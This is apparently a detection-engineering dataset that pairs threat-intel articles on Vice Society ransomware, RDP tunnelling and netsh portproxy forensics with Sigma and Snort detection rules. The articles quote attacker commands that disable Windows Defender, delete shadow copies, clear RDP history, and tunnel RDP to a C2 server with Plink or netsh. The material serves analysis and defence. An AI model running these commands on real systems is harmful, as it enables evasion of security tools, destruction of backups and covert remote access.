Kitty RaaS\n  Linux 64bit\n  \n  November 9, 2022\n  Rans Recovery\n  Windows 64bit\n  Similar code to Vice Society\n  \n  November 9, 2022\n  Vice Society ransomware\n  Windows 64bit\n  Custom ransomware build\n  \n  ©2023 TREND MICRO\n```\n\n*Figure 1. Vice Society’s evolution throughout 2021 to late 2022*\n\n```image\nAlt: Figure 2. Trend Micro ™ Smart Protection Network ™ (SPN) detections for Vice Society from November 2022 to January 2023 (unique endpoints)\nDescription: The image is a bar chart that illustrates the distribution of ransomware attacks by industry as reported on Vice Society's leak site. The chart categorizes various industries, including Communication and Media, Healthcare, Insurance, and Manufacturing, by the number of attacks from different countries: Argentina, Brazil, Israel, and Switzerland. Notably, the Manufacturing sector shows a significant number of attacks, with 34 incidents attributed to Brazil, while other industries and countries have considerably lower counts. Each category is color-coded according to the country, enhancing the visual comparison.\nTranscription: |\n  | Industry                | Argentina | Brazil | Israel | Switzerland |\n  | ----------------------- | --------- | ------ | ------ | ----------- |\n  | Communication and Media | 0         | 2      | 0      | 0           |\n  | Healthcare              | 1         | 0      | 1      | 0           |\n  | Insurance               | 0         | 1      | 0      | 0           |\n  | Manufacturing           | 0         | 34     | 0      | 0           |\n  | Not specified           | 1         | 0      | 2      | 0           |\n  \n  ©2023 TREND MICRO\n```\n\n*Figure 2. Trend Micro ™ Smart Protection Network ™ (SPN) detections for Vice Society from November 2022 to January 2023 (unique endpoints)*\n\n```image\nAlt: Figure 3. Distribution of affected industries based on the Vice Society leak site\nDescription: The image is a bar chart displaying the distribution of ransomware attacks attributed to the Vice Society group across various industries. The chart lists categories such as Education (51 attacks), Manufacturing (32), Healthcare (22), Government (10), Financial Services (5), and Others (23). The bars are colored red, indicating the number of unique endpoints affected within each sector, providing a visual representation of the group's targeting strategy across different industries.\nTranscription: |\n  Education         51\n  Manufacturing     32\n  Healthcare        22\n  Government        10\n  Financial Services 5\n  Others            23\n```\n\n*Figure 3. Distribution of affected industries based on the Vice Society leak site*\n\n## Technical analysis and infection flow\n\nBased on our internal telemetry, we were able to create an infection diagram for a Vice Society ransomware attack (illustrated in Figure 4). The arrival vector likely involves the exploitation of a public-facing website or abuse of compromised remote desktop protocol (RDP) credentials.\n\n```image\nAlt: Figure 4. The infection chain of a Vice Society attack\nDescription: The image illustrates the infection chain of the Vice Society ransomware attack. It depicts a flowchart with various nodes representing the steps involved in the attack, starting from the exploitation of Rubeus and Cobalt Strike, leading to the deployment of Zeppelin ransomware, the execution of the Mimikatz tool, and the final deployment of Vice Society ransomware. The flowchart includes actions such as exfiltration of data, deletion of shadow copies, and clearing of event logs, all connected by arrows to indicate the sequence of events.\nTranscription: |\n  [Infection Chain of a Vice Society Attack]\n  \n  1. Rubes and Cobalt Strike\n     ↓\n  2. Desktop Central\n     ↓\n  3. Mimikatz\n     ↓\n  4. Presence of the file infector Neshta\n     ↓\n  5. Deploy and execute Vice Society ransomware in Hyper-V endpoints\n     ↓\n  6. Exfiltrate data\n     ↓\n  7. Delete shadow copies\n     ↓\n  8. Clear event viewer logs and remote session traces\n  \n  [Zeppelin Ransomware]\n  - \"smile.exe\"\n     ↓\n  [Deploy PSEXec to Some Endpoints]\n     ↓\n  [Execute \"w1.ps1\" Located in Windows Shares to Every Endpoint]\n     ↓\n  [Create Admin Account, Add to Localgroup and Remote Desktop Users]\n     ↓\n  [Terminate Processes]\n```\n\n*Figure 4. The infection chain of a Vice Society attack*\n\nThe following table shows what we were able to observe from a Vice Society attack. Note that all endpoints indicated belong to one Pointer to the GUID.\n\n| **Date**          | **Description**                                                                                                                                                                                                                                                                                                                                              |\n| ----------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |\n| October 28, 2022  | Possible entry point using Cobalt Strike and the Rubeus hacktool. Cobalt Strike connects to 57thandnormal[.]com                                                                                                                                                                                                                                              |\n| November 12, 2022 | Deployed Zeppelin ransomware. Path: C:\\mnt\\smile.exe                                                                                                                                                                                                                                                                                                         |\n| November 12, 2022 | Deployed Mimikatz. Path: C:\\ProgramData\\toolkiit\\{redacted}\\output\\C\\$Recycle.Bin\\{redacted}\\$RY0DNVE.exe                                                                                                                                                                                                                                                    |\n| November 12, 2022 | Executed a PowerShell script (w1.ps1). Command: /c powershell.exe -ExecutionPolicy Bypass -file \\\\{ComputerName}\\s$\\w1.ps1                                                                                                                                                                                                                                   |\n| November 12, 2022 | Disabled antivirus (AV) programs such as Windows Defender. add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiVirus /t REG_DWORD /d 1 /f                                                                                                                                                                                                  |\n| November 12, 2022 | Deployed Vice Society ransomware. Path: C:\\ProgramData\\test.exe                                                                                                                                                                                                                                                                                              |\n| November 12, 2022 | Created Administrator account on each endpoint, add to Administrators and Remote Desktop Users localgroup. user Administrator {password} /add                                                                                                                                                                                                                |\n| November 12, 2022 | Terminated processes such as AV and security software. process where “name like ‘%Agent%’” delete                                                                                                                                                                                                                                                            |\n| November 12, 2022 | Exfiltrated important files                                                                                                                                                                                                                                                                                                                                  |\n| November 12, 2022 | Multiple deployments of Vice Society ransomware was dropped in the %Temp% directory on different endpoints. Path: C:\\windows\\temp\\svchost.exe                                                                                                                                                                                                                |\n| November 12, 2022 | Observed file infector Neshta                                                                                                                                                                                                                                                                                                                                |\n| November 12, 2022 | Performed ransomware routine via $mytemp$\\svchost.exe \"/c vssadmin.exe Delete Shadows /All /Quiet\"                                                                                                                                                                                                                                                           |\n| November 12, 2022 | Vice Society ransomware routine is performed (files are encrypted, ransom note with email contacts is dropped and files are appended with the extension .v1cesO0ciety). Ransom note: AllYFilesAE! Extension: .v1cesO0ciety Contact email of ransom operators: 876505846904@onionmail[.]org, 316186524106@onionmail[.]org, v-society.official@onionmail[.]org |\n| November 12, 2022 | Event viewer logs and remote session traces such as RDP and terminal services were cleared. reg delete \"\"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\"\" /va /f                                                                                                                                                                        |\n| November 12, 2022 | Deleted itself from the system. \"%System%\\cmd.exe\" /c del {Malware File Path}\\{Malware File Name} -&gt; nul -&gt; to delete itself                                                                                                                                                                                                                           |\n\n### Table 1. Date and description of the routines involved in a Vice Society attack\n\nThe weaponized tool used by Vice Society is Cobalt Strike, which allows the group to remotely access and control the infected endpoint. The threat actor also used the Rubeus C# toolset for raw Kerberos interaction and abuse (although this is not a new technique, since it has been previously used by Ryuk, Conti, and BlackCat).\n\nTo laterally move within the target network, Mimikatz was used to dump passwords. We also observed the presence of the Zeppelin ransomware from another endpoint. Vice Society was known to have deployed Zeppelin before, however, perhaps due to its weaker encryption, the threat actor decided to go with custom-built ransomware.\n\nVice Society will then execute a PowerShell script to create an administrator account that allows for the remote access of other endpoints and to terminate several processes such as running security software before dropping the custom-built ransomware. In most of the Vice Society detections we also observed the presence of Neshta file infector (which can be cleaned by Trend Micro), although it is not clear how this occurred.\n\nVirtual servers, such as Microsoft Hyper-V, are also affected in this attack. We also found the attacker removing traces of RDP sessions such as wevtutil.exe, a technique that was previously used by Clop ransomware and KillDisk.\n\n```image\nAlt: Figure 5. The ransomware note (top) and desktop ransom message (bottom) displayed on the victim’s machine\nDescription: The image displays a ransomware note from the Vice Society group, indicating that the victim's files have been encrypted. It includes instructions for the victim on how to recover their files, stating that they must purchase a unique private key from the attackers. The note also mentions an email address for contact, alternative email options, and provides warnings against using third-party software for decryption. The formatting suggests a typical ransom note layout, emphasizing urgency and the promise of partial decryption as proof of possession of the decryption key.\nTranscription: |\n  ALL YOUR FILES HAVE BEEN ENCRYPTED BY \"VICE SOCIETY\"\n  \n  All your important documents, photos, databases were stolen and encrypted.\n  \n  If you don't contact us in 7 days we will upload your files to darknet.\n  \n  The only method of recovering files is to purchase an unique private key.\n  We are the only who can give you tool to recover your files.\n  \n  To prove that we have the key and it works you can send us 2 files and we will decrypt it for free (not more than 2 MB each).\n  \n  Write to email:\n  Alternative email:\n  Public email:\n  Our tor website:\n  Our mirrors:\n  \n  Attention!\n  * Do not rename encrypted files.\n  * Do not try to decrypt your data using third party software, it may cause permanent data loss.\n  * Decryption of your files with the help of third parties may cause increased price (they add their fee to ours) or you can become a victim of a scam.\n```\n\n*Figure 5. The ransomware note (top) and desktop ransom message (bottom) displayed on the victim’s machine*\n\n```image\nAlt: Figure 6. The primary TOR website and mirror links\nDescription: The image depicts the main page of the Vice Society ransomware group's website. The design features a purple background with stylized text that reads 'RANSOMWARE Vice Society.' Below the main title, there are sections labeled 'FOR JOURNALISTS,' 'FOR VICTIMS,' and 'OUR BLOG,' suggesting that the website provides information and resources for various stakeholders. The phrase 'With Love!' is included, indicating a characteristic tone of ransomware groups that often communicate with a specific branding style. Additionally, there are links to their social media or communication platforms, indicated by 'We are also here:' followed by blurred elements.\nTranscription: |\n  RAN\n  SOM\n  WARE\n  Vice Society\n  \n  With Love!\n  \n  FOR JOURNALISTS\n  FOR VICTIMS\n  OUR BLOG\n  \n  We are also here:\n```\n\n*Figure 6. The primary TOR website and mirror links*\n\n```image\nAlt: Figure 7. Vice Society’s file storage site\nDescription: The image displays a web directory index page, which appears to be a file listing from a remote server. The directory contains several entries with timestamps indicating the dates and times files were uploaded, specifically around mid-December 2022. The filenames are not fully visible, but the structure suggests this is a listing of files possibly related to the Vice Society ransomware group's operations, indicating a potential location for stolen or compromised data.\nTranscription: |\n  Index of /JhykowedsgX/Vvz6wbviudn9sF/\n  \n  ../\n  2602                     15-Dec-2022 00:37\n  941                      15-Dec-2022 00:17\n  990s                     15-Dec-2022 00:01\n  A Fi                     15-Dec-2022 01:07\n```\n\n*Figure 7. Vice Society’s file storage site*\n\nOnce the administrator account is added and established, Vice Society can terminate several processes, including security-related ones, to enable the successful deployment and execution of its ransomware on the affected endpoints.\n\n## Conclusion and Trend Micro solutions\n\nVice Society seems to be constantly improving their capabilities, managing to build their own custom-built ransomware while also continuing to employ toolsets such as Cobalt Strike and malware such as Zeppelin and Hello Kitty/FiveHands to enhance their routines. Given what we know of the group’s technical knowledge and their willingness to target several different industries and regions, we can expect them to remain a significant player in the ransomware landscape and a threat that organizations must keep track of moving forward.\n\nA multilayered approach can help organizations guard possible entry points into their system, such as endpoints, emails, web, and networks. The following security solutions can detect malicious components and suspicious behavior, which can help protect enterprises.\n\n- Trend Micro Vision One™ provides multilayered protection and behavior detection, which helps block questionable behavior and tools early on before the ransomware can do irreversible damage to the system.\n- Trend Micro Cloud One™ Workload Security protects systems against both known and unknown threats that exploit vulnerabilities. This protection is made possible through techniques such as virtual patching and machine learning.\n- Trend Micro™ Deep Discovery™ Email Inspector employs custom sandboxing and advanced analysis techniques to effectively block malicious emails, including phishing emails that can serve as entry points for ransomware.\n- Trend Micro Apex One™ offers next-level automated threat detection and response against advanced concerns such as fileless threats and ransomware, ensuring the protection of endpoints.\n\n### Indicators of Compromise\n\nThe indicators of compromise for this blog entry can be found here.",
    "sigma_rule": {
      "title": "Terminal Server Client Connection History Cleared - Registry",
      "id": "07bdd2f5-9c58-4f38-aec8-e101bb79ef8d",
      "status": "test",
      "description": "Detects the deletion of registry keys containing the MSTSC connection history",
      "references": [
        "https://learn.microsoft.com/en-us/troubleshoot/windows-server/remote/remove-entries-from-remote-desktop-connection-computer",
        "http://woshub.com/how-to-clear-rdp-connections-history/",
        "https://www.trendmicro.com/en_us/research/23/a/vice-society-ransomware-group-targets-manufacturing-companies.html"
      ],
      "author": "Christian Burkard (Nextron Systems)",
      "date": "2021-10-19",
      "modified": "2023-02-08",
      "tags": [
        "attack.defense-evasion",
        "attack.t1070",
        "attack.t1112"
      ],
      "logsource": {
        "category": "registry_delete",
        "product": "windows"
      },
      "detection": {
        "selection1": {
          "EventType": "DeleteValue",
          "TargetObject|contains": "\\Microsoft\\Terminal Server Client\\Default\\MRU"
        },
        "selection2": {
          "EventType": "DeleteKey",
          "TargetObject|contains": "\\Microsoft\\Terminal Server Client\\Servers\\"
        },
        "condition": "1 of selection*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_delete\\registry_delete_mstsc_history_cleared.yml",
    "id": "912"
  },
  {
    "url": "https://cloud.google.com/blog/topics/threat-intelligence/bypassing-network-restrictions-through-rdp-tunneling/",
    "markdown": "# Bypassing Network Restrictions Through RDP Tunneling\n\n**January 24, 2019**\n\n---\n\nRemote Desktop Services is a component of Microsoft Windows that is used by various companies for the convenience it offers systems administrators, engineers, and remote employees. On the other hand, Remote Desktop Services, and specifically the Remote Desktop Protocol (RDP), offers this same convenience to remote threat actors during targeted system compromises. When sophisticated threat actors establish a foothold and acquire ample logon credentials, they may switch from backdoors to using direct RDP sessions for remote access. When malware is removed from the equation, intrusions become increasingly difficult to detect.\n\n## RDPing Against the Rules\n\nThreat actors continue to prefer RDP for the stability and functionality advantages over non-graphical backdoors, which can leave unwanted artifacts on a system. As a result, FireEye has observed threat actors using native Windows RDP utilities to connect laterally across systems in compromised environments. Historically, non-exposed systems protected by a firewall and NAT rules were generally considered not to be vulnerable to inbound RDP attempts; however, threat actors have increasingly started to subvert these enterprise controls with the use of network tunneling and host-based port forwarding.\n\nNetwork tunneling and port forwarding take advantage of firewall \"pinholes\" (ports not protected by the firewall that allow an application access to a service on a host in the network protected by the firewall) to establish a connection with a remote server blocked by a firewall. Once a connection has been established to the remote server through the firewall, the connection can be used as a transport mechanism to send or \"tunnel\" local listening services (located inside the firewall) through the firewall, making them accessible to the remote server (located outside the firewall), as shown in Figure 1.\n\n```image\nAlt: Enterprise firewall bypass using RDP and network tunneling with SSH as an example\nDescription: The image illustrates a network configuration demonstrating how RDP tunneling can bypass an enterprise firewall. On the left, a Linux command and control (C2) server is shown with the IP address 192.168.60.135 and SSH service listening on TCP port 22. In the center, there is a representation of an enterprise firewall that blocks inbound connections but allows outbound connections. On the right, an enterprise network is depicted with a victim system running Windows 7, which has inbound RDP connections allowed. The green arrow indicates outbound traffic from the victim system, while the red cross signifies blocked inbound traffic from the C2 server.\nTranscription: |\n  +---------------------+-------------------------+\n  | Linux C2 Server     | 192.168.60.135          |\n  |                     | SSHd listening on TCP22 |\n  +---------------------+-------------------------+\n  | Enterprise firewall | Blocks inbound          |\n  |                     | Allows Outbound         |\n  +---------------------+-------------------------+\n  | Enterprise network  | Victim System           |\n  |                     | Windows 7               |\n  |                     | Inbound RDP allowed     |\n  +---------------------+-------------------------+\n```\n\n*Figure 1: Enterprise firewall bypass using RDP and network tunneling with SSH as an example*\n\n## Inbound RDP Tunneling\n\nA common utility used to tunnel RDP sessions is PuTTY Link, commonly known as Plink. Plink can be used to establish secure shell (SSH) network connections to other systems using arbitrary source and destination ports. Since many IT environments either do not perform protocol inspection or do not block SSH communications outbound from their network, attackers such as FIN8 have used Plink to create encrypted tunnels that allow RDP ports on infected systems to communicate back to the attacker command and control (C2) server.\n\n```\nExample Plink Executable Command:\n\nplink.exe <users>@<IP or domain> -pw <password> -P 22 -2 -4 -T -N -C -R 12345:127.0.0.1:3389\n```\n\nFigure 2 provides an example of a successful RDP tunnel created using Plink, and Figure 3 provides an example of communications being sent through the tunnel using port forwarding from the attacker C2 server.\n\n```image\nAlt: Example of successful RDP tunnel created using Plink\nDescription: The image depicts a network diagram illustrating the process of RDP tunneling using Plink. It shows a Linux C2 (command and control) server that receives a connection on TCP port 22. The diagram highlights that the enterprise firewall blocks inbound connections but allows outbound ones. An arrow indicates the establishment of a tunnel to a victim system, where the Plink executable is executed to open the tunnel, utilizing an ephemeral TCP port for the connection. The diagram visually represents the flow of communication between the systems involved.\nTranscription: |\n  +------------------------------+---------------------+-----------------------------------+\n  | Linux C2 Server              | Enterprise firewall | Victim System                     |\n  | Received connection on TCP22 | Blocks inbound      | plink.exe executed to open tunnel |\n  +------------------------------+---------------------+-----------------------------------+\n  |                              | Allows Outbound     |                                   |\n  +------------------------------+---------------------+-----------------------------------+\n  |                              |                     | Ephemeral TCP port                |\n  +------------------------------+---------------------+-----------------------------------+\n```\n\n*Figure 2: Example of successful RDP tunnel created using Plink*\n\n```image\nAlt: Example of successful port forwarding from the attacker C2 server to the victim\nDescription: The image illustrates the process of RDP tunneling, specifically showing the communication flow between a Linux Command and Control (C2) server and a victim system. It depicts how RDP connections are forwarded through a secure tunnel established on TCP port 22, while the enterprise firewall blocks inbound traffic but allows outbound connections. The victim system is shown to be listening for RDP on TCP port 3389, with the text indicating the specific TCP ports involved in the tunneling process.\nTranscription: |\n  +---------------------+--------------------------------+\n  | Linux C2 Server     | RDP connect to 127.0.0.1:12345 |\n  |                     |                                |\n  |                     | TCP 12345 forwards to TCP 22   |\n  +---------------------+--------------------------------+\n  | Enterprise firewall | Blocks inbound                 |\n  |                     | Allows Outbound                |\n  +---------------------+--------------------------------+\n  |                     | RDP travels through tunnel     |\n  |                     |                                |\n  | Victim System       | Listening for RDP on TCP 3389  |\n  |                     |                                |\n  |                     | Ephemeral TCP port             |\n  +---------------------+--------------------------------+\n```\n\n*Figure 3: Example of successful port forwarding from the attacker C2 server to the victim*\n\nIt should be noted that for an attacker to be able to RDP to a system, they must already have access to the system through other means of compromise in order to create or access the necessary tunneling utility. For example, an attacker’s initial system compromise could have been the result of a payload dropped from a phishing email aimed at establishing a foothold into the environment, while simultaneously extracting credentials to escalate privileges. RDP tunneling into a compromised environment is one of many access methods typically used by attackers to maintain their presence in an environment.\n\n## Jump Box Pivoting\n\nNot only is RDP the perfect tool for accessing compromised systems externally, RDP sessions can be daisy chained across multiple systems as a way to move laterally through an environment. FireEye has observed threat actors using the native Windows Network Shell (netsh) command to utilize RDP port forwarding as a way to access newly discovered segmented networks reachable only through an administrative jump box.\n\n```\nExample netsh Port Forwarding Command:\nnetsh interface portproxy add v4tov4 listenport=8001 listenaddress=<JUMP BOX IP> connectport=3389 connectaddress=<DESTINATION IP>\n\nExample Shortened netsh Port Forwarding Command:\nnetsh I p a v l=8001 listena=<JUMP BOX IP> connectp=3389 c=<DESTINATION IP>\n```\n\nFor example, a threat actor could configure the jump box to listen on an arbitrary port for traffic being sent from a previously compromised system. The traffic would then be forwarded directly through the jump box to any system on the segmented network using any designated port, including the default RDP port TCP 3389. This type of RDP port forwarding gives threat actors a way to utilize a jump box’s allowed network routes without disrupting legitimate administrators who are using the jump box during an ongoing RDP session. Figure 4 provides an example of RDP lateral movement to a segmented network via an administrative jump box.\n\n```image\nAlt: Lateral Movement via RDP using a jump box to a segmented network\nDescription: The image illustrates a network diagram depicting the process of lateral movement via Remote Desktop Protocol (RDP) using a jump box to access a segmented network. It shows a threat actor originating from the Internet, targeting a victim system that is part of a Local Area Network (LAN) connected to a jump box. The jump box is also shown connecting to a segmented network through a firewall. RDP connections are indicated between the threat actor, the jump box, the victim system, and the segmented network, highlighting how RDP can be utilized for lateral movement in a compromised environment.\nTranscription: |\n  +---------------------+\n  |   Segmented Network  |\n  +---------------------+\n            ^\n            |\n           RDP\n            |\n  +---------------------+\n  |      Firewall       |\n  +---------------------+\n            ^\n            |\n           RDP\n            |\n  +---------------------+\n  |        LAN          |\n  +---------------------+\n            ^\n            |\n           RDP\n            |\n  +---------------------+\n  |      Jump Box       |\n  +---------------------+\n            ^\n            |\n           RDP\n            |\n  +---------------------+\n  |    Victim System    |\n  +---------------------+\n            ^\n            |\n           RDP\n            |\n  +---------------------+\n  |    Threat Actor     |\n  +---------------------+\n            |\n         Internet\n```\n\n*Figure 4: Lateral Movement via RDP using a jump box to a segmented network*\n\n## Prevention and Detection of RDP Tunneling\n\nIf RDP is enabled, threat actors have a way to move laterally and maintain presence in the environment through tunneling or port forwarding. To mitigate vulnerability to and detect these types of RDP attacks, organizations should focus on both host-based and network-based prevention and detection mechanisms. For additional information see the FireEye blog post on establishing a baseline for remote desktop protocol.\n\n### Host-Based Prevention:\n\n- **Remote Desktop Service**: Disable the remote desktop service on all end-user workstations and systems for which the service is not required for remote connectivity.\n- **Host-based Firewalls**: Enable host-based firewall rules that explicitly deny inbound RDP connections.\n- **Local Accounts**: Prevent the use of RDP using local accounts on workstations by enabling the “Deny log on through Remote Desktop Services” security setting.\n\n### Host-Based Detection:\n\n- **Registry Keys**: Review registry keys associated with Plink connections that can be abused by RDP session tunneling to identify unique source and destination systems. By default, both PuTTY and Plink store session information and previously connected ssh servers in the following registry keys on Windows systems:\n  - `HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY`\n  - `HKEY_CURRENT_USER\\SoftWare\\SimonTatham\\PuTTY\\SshHostKeys`\n\n  Similarly, the creation of a PortProxy configuration with netsh is stored with the following Windows registry key:\n  - `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4`\n\n- **Event Logs**: Review event logs for high-fidelity logon events. Common RDP logon events are contained in the following event logs on Windows systems:\n  - `%systemroot%\\Windows\\System32\\winevt\\Logs\\Microsoft-TerminalServices-LocalSessionmanager%3Operational.evtx`\n  - `%systemroot%\\Windows\\System32\\winevt\\Logs\\Security.evtx`\n\n  The “TerminalServices-LocalSessionManager” log contains successful interactive local or remote logon events as identified by EID 21 and successful reconnection of a previously established RDP session not terminated by a proper user logout as identified by EID 25. The “Security” log contains successful Type 10 remote interactive logons (RDP) as identified by EID 4624. A source IP address recorded as a localhost IP address (127.0.0.1 – 127.255.255.255) may be indicative of a tunneled logon routed from a listening localhost port to the localhost’s RDP port TCP 3389.\n\n- Review your artifacts of execution for “plink.exe” file execution. Note that attackers can rename the file name to avoid detection. Relevant artifacts include, but are not limited to:\n  - Application Compatibility Cache/Shimcache\n  - Amcache\n  - Jump Lists\n  - Prefetch\n  - Service Events\n  - CCM Recently Used Apps from the WMI repository\n  - Registry keys\n\n### Network-Based Prevention:\n\n- **Remote Connectivity**: Where RDP is required for connectivity, enforce the connection to be initiated from a designated jump box or centralized management server.\n- **Domain Accounts**: Employ the “Deny log on through Remote Desktop Services” security setting for privileged accounts (e.g. domain administrators) and service accounts, as these types of accounts are commonly used by threat actors to laterally move to sensitive systems in an environment.\n\n### Network-Based Detection:\n\n- **Firewall Rules**: Review existing firewall rules to identify areas of vulnerability to port forwarding. In addition to the potential use of port forwarding, monitoring for internal communications between workstations in the environment should be conducted. Generally, workstations do not have a need to communicate with one another directly and Firewall rules can be used to prevent any such communication, except where needed.\n- **Network Traffic**: Perform content inspection of network traffic. Not all traffic communicating on a given port is what it appears to be. For example, threat actors may use TCP ports 80 or 443 to establish an RDP tunnel with a remote server. Deep inspection of the network traffic can likely reveal that it is not actually HTTP or HTTPS, but entirely different traffic all together. Therefore, organizations should closely monitor their network traffic.\n- **Snort Rules**: The main indicator of tunneled RDP occurs when the RDP handshake has a designated low source port generally used for another protocol. Figure 5 provides two sample Snort rules that can help security teams identify RDP tunneling in their network traffic by identifying designated low source ports generally used for other protocols.\n\n```\nalert tcp any [21,22,23,25,53,80,443,8080] -> any !3389 (msg:\"RDP - HANDSHAKE [Tunneled msts]\"; dsize:<65; content:\"|03 00 00|\"; depth:3; content:\"|e0|\"; distance:2; within:1; content:\"Cookie: mstshash=\"; distance:5; within:17; sid:1; rev:1;)\n```\n\n```\nalert tcp any [21,22,23,25,53,80,443,8080] -> any !3389 (msg:\"RDP - HANDSHAKE [Tunneled]\"; flow:established; content:\"|c0 00|Duca\"; depth:250; content:\"rdpdr\"; content:\"cliprdr\"; sid:2; rev:1;)\n```\n\n*Figure 5: Sample Snort Rules to identify RDP tunneling*\n\n## Conclusion\n\nRDP enables IT environments to offer freedom and interoperability to users. But with more and more threat actors using RDP to move laterally across networks with limited segmentation, security teams are being challenged to decipher between legitimate and malicious RDP traffic. Therefore, adequate host-based and network-based prevention and detection methods should be taken to actively monitor for and be able to identify malicious RDP usage.",
    "sigma_rule": {
      "title": "New PortProxy Registry Entry Added",
      "id": "a54f842a-3713-4b45-8c84-5f136fdebd3c",
      "status": "test",
      "description": "Detects the modification of the PortProxy registry key which is used for port forwarding.",
      "references": [
        "https://cloud.google.com/blog/topics/threat-intelligence/bypassing-network-restrictions-through-rdp-tunneling/",
        "https://adepts.of0x.cc/netsh-portproxy-code/",
        "https://www.dfirnotes.net/portproxy_detection/"
      ],
      "author": "Andreas Hunkeler (@Karneades)",
      "date": "2021-06-22",
      "modified": "2024-03-25",
      "tags": [
        "attack.lateral-movement",
        "attack.defense-evasion",
        "attack.command-and-control",
        "attack.t1090"
      ],
      "logsource": {
        "category": "registry_event",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "\\Services\\PortProxy\\v4tov4\\tcp\\"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "WSL2 network bridge PowerShell script used for WSL/Kubernetes/Docker (e.g. https://github.com/microsoft/WSL/issues/4150#issuecomment-504209723)",
        "Synergy Software KVM (https://symless.com/synergy)"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_event\\registry_event_portproxy_registry_key.yml",
    "id": "925"
  },
  {
    "url": "https://www.dfirnotes.net/portproxy_detection/",
    "markdown": "# Port Proxy detection\n\n## How can we see port proxy configurations in DFIR?\n\nI came across a new (to me) technique for evasion and persistence reading news today. The report(1) specifically called out the clever use of built in Windows service control and network utilities (sc, netsh) by some attackers they’d investigated. After Googling for a few minutes it was clear that this technique is known to Windows sysadmins and the attacker community (as it is featured in a Metasploit module(2).\n\nSo, let’s run the process: create the behaviour in the lab, look for the artifacts, and then figure out how to capture and analyse them.\n\n## Make some in the lab\n\nI created a portproxy configuration with netsh on archie, Win10 x64 to send traffic out to another host, port. Tested with netcat chat. Also made one in the seven VM, and the dumped memory variously.\n\n```\nnetsh>add v4tov4 listenport=3333 connectaddress=192.168.0.8 connectport=8888 listenaddress=0.0.0.0\n\nPS C:\\malware> netsh interface portproxy show all\n\nListen on ipv4:             Connect to ipv4:\n\nAddress         Port        Address         Port\n--------------- ----------  --------------- ----------\n0.0.0.0         3333        192.168.0.8     8888\n```\n\nAnd it can be seen in running processes, with `netstat -naobp TCP`:\n\n```\nTCP    192.168.0.15:3333      192.168.0.15:16047     ESTABLISHED     1572   iphlpsvc\n```\n\n## Can we find it with Memory Analysis?\n\nVolatile capture with winpmem2, write raw for volatility’s use.\n\n```\nPS> winpmem-2.1.post4.exe -o archie.aff4\nPS> rekal.exe imagecopy -f .\\archie.aff4 -O archie.raw\n```\n\nAfter imageinfo to get profile(s), some nosing about to find memory that references the port proxy…\n\n- netsh may not have been running at time of w10 mem capture\n- Yarascan for the port number as string:\n  ```\n  rekal.exe -f .\\archie.aff4 yarascan --string '3333'\n  ```\n  - many results that don’t look related, probably too broad a key\n- ibid for the IP address .. left running for a couple hours\n- another try for ‘ProxyPort’ gets at least one hit:\n\n```\narchie> rekal.exe -f .\\archie.aff4 yarascan --string 'PortProxy'\n2017-02-08 18:50:24,236:WARNING:rekall.1:Unable to parse profile section $CONSTANT_TYPES\n2017-02-08 18:50:24,237:WARNING:rekall.1:Unable to parse profile section $CONSTANT_TYPES\nOwner    Rule        Offset                                  HexDump                              Symbol\n----- ---------- -------------- ----------------------------------------------------------------- ------\n-     r1         0x8202038bd448 50 6f 72 74 50 72 6f 78 79 00 00 05 20 00 00 00  PortProxy.......\n                                a8 ff ff ff 6e 6b 20 00 02 d9 44 a6 97 3f d2 01  ....nk....D..?..\n                                03 00 00 00 28 b1 4d 00 01 00 00 00 00 00 00 00  ....(.M.........\n                                10 4b 5e 00 ff ff ff ff 0b 00 00 00 28 45 5e 00  .K^.........(E^.                              \n```\n\n## How about dynamic analysis?\n\nOf course we know we can see them in netsh as above. Win10 netsh depreciation notice refers us to Powershell. Some trial and error with those modules did not uncover the portproxy settings.\n\n```\nIn future versions of Windows, Microsoft might remove the Netsh functionality\nfor TCP/IP.\n\nMicrosoft recommends that you transition to Windows PowerShell if you currently\nuse netsh to configure and manage TCP/IP.\n\nType Get-Command -Module NetTCPIP at the Windows PowerShell prompt to view\na list of commands to manage TCP/IP.\n\nVisit http://go.microsoft.com/fwlink/?LinkId=217627 for additional information\nabout PowerShell commands for TCP/IP.\n```\n\nGuessing the storage is Registry, trying RegShot in the live VM shows it clearly:\n\n```\nHKLM\\SYSTEM\\ControlSet001\\services\\PortProxy\\v4tov4\\tcp\\0.0.0.0/4444: \"192.168.0.15/8080\"\nHKLM\\SYSTEM\\CurrentControlSet\\services\\PortProxy\\v4tov4\\tcp\\0.0.0.0/4444: \"192.168.0.15/8080\"\n```\n\nAnd now we can look with EG printkey on the memory dump(s)…\n\nIt’s included in output of\n\n```\nPS> rekal.exe -f .\\archie.aff4 printkey -r -k \"\\ControlSet001\\Services\" > archie-rekall-services.txt\n```\n\nbut it’s just a tease:\n\n```\nRegistry: Unnamed @ 0x82020323e000\nKey name: PortProxy (S) @ 0x8202038bd3fc\nLast updated: 2017-02-08 15:14:52Z\n\nSubkeys:\n\nValues:\n```\n\nand I’m having trouble pinning it down or getting the full details out with Rekall or Vol26. Printkey is always so fiesty…\n\n```\nPS C:\\malware> C:\\tools\\volatility_2.6_win64_standalone\\volatility_2.6_win64_standalone.exe -f .\\seven-memdump.mem --profile Win7SP1x86_23418 printkey -K \"services\"\nVolatility Foundation Volatility Framework 2.6\nLegend: (S) = Stable   (V) = Volatile\n\nThe requested key could not be found in the hive(s) searched\nPS C:\\malware> C:\\tools\\volatility_2.6_win64_standalone\\volatility_2.6_win64_standalone.exe -f .\\seven-memdump.mem --profile Win7SP1x86_23418 printkey -K \"ControlSet001\"\nVolatility Foundation Volatility Framework 2.6\nLegend: (S) = Stable   (V) = Volatile\n\n----------------------------\nRegistry: \\REGISTRY\\MACHINE\\SYSTEM\nKey name: ControlSet001 (S)\nLast updated: 2013-10-23 16:16:25 